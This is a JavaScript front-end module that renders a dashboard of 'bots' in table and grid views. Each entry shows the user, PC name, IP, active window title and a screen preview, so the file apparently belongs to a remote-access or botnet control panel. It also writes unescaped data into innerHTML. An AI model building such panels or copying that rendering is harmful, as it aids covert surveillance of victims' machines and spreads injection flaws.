// frontend/dashboard/js/modules/ui/renderer.js
// Отрисовка данных в табличном или плиточном виде с поддержкой скелетной загрузки
const getFlag = l => (!l || l.length !== 2) ? '🏳️' : l.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397));
const $ = id => document.getElementById(id);

let isGridView = false;
const MIN_SKELETONS = 35;

export const Renderer = {
    getIsGridView: () => isGridView,

    toggleView() {
        isGridView = !isGridView;
        const btn = $('toggleView');
        btn && (btn.innerHTML = isGridView ? '<i class="fas fa-list"></i> Table' : '<i class="fas fa-th"></i> Grid');
        return isGridView;
    },

    _getRowTemplate: c => `
        <td><div class="status-wrapper"><span class="status-dot-mini ${c.status}"></span> ${getFlag(c.loc)}</div></td>
        <td><span class="cell-content truncate">${c.user || '—'}</span></td>
        <td><span class="cell-content truncate">${c.pc_name || '—'}</span></td>
        <td><span class="cell-content truncate">${c.last_active || '—'}</span></td>
        <td><span class="cell-content truncate">${c.ip || '—'}</span></td>
        <td><span class="cell-content truncate" title="${c.active_window || ''}">${c.active_window || '—'}</span></td>
        <td><span class="cell-content truncate client-id-cell">${c.id}</span></td>`,

    _getSkeletonRow: () => `
        <tr class="skeleton-row">
            <td><div class="status-wrapper"><div class="skeleton-dot"></div></div></td>
            ${'<td><div class="skeleton-line"></div></td>'.repeat(6)}
        </tr>`,

    _getSkeletonCard: () => `
        <div class="client-card skeleton-card">
            <div class="bot-preview skeleton-pulse"></div>
            <div class="bot-card-body">
                <div class="skeleton-line" style="width: 80%; height: 12px; margin: 5px 0;"></div>
                <div class="skeleton-line" style="width: 50%; height: 10px; opacity: 0.5;"></div>
            </div>
        </div>`,

    render(list) {
        const tc = $('table-container'), gc = $('grid-view');
        if (!tc || !gc) return;

        tc.classList.toggle('hidden', isGridView);
        gc.classList.toggle('hidden', !isGridView);

        const displayList = isGridView ? list.filter(c => c.status === 'online') : list;
        isGridView ? this.drawGrid(displayList, gc) : this.drawTable(displayList);
    },

    drawTable(list) {
        const tbody = $('clients-list');
        if (!tbody) return;

        tbody.innerHTML = list.map(bot => `
            <tr class="client-row ${bot.status}" data-client-id="${bot.id}">
                ${this._getRowTemplate(bot)}
            </tr>`).join('');

        const skels = Math.max(0, MIN_SKELETONS - list.length);
        tbody.insertAdjacentHTML('beforeend', this._getSkeletonRow().repeat(skels));
    },

    drawGrid(list, cont) {
        const cards = list.map(c => `
            <div class="client-card ${c.status}" data-client-id="${c.id}">
                <div class="bot-preview">
                    <img src="${c.lastPreview || '../images/test2.jpg'}" id="prev-${c.id}">
                </div>
                <div class="bot-card-body">
                    <div class="bot-info-row">
                        <span class="flag-emoji">${getFlag(c.loc)}</span>
                        <div class="bot-data-string">
                             <span>${c.ip || '0.0.0.0'}</span>
                             <span class="data-separator">|</span>
                             <span class="data-part-id">${c.id}</span>
                        </div>
                    </div>
                </div>
            </div>`).join('');

        const skels = Math.max(0, MIN_SKELETONS - list.length);
        cont.innerHTML = cards + this._getSkeletonCard().repeat(skels);
    }
};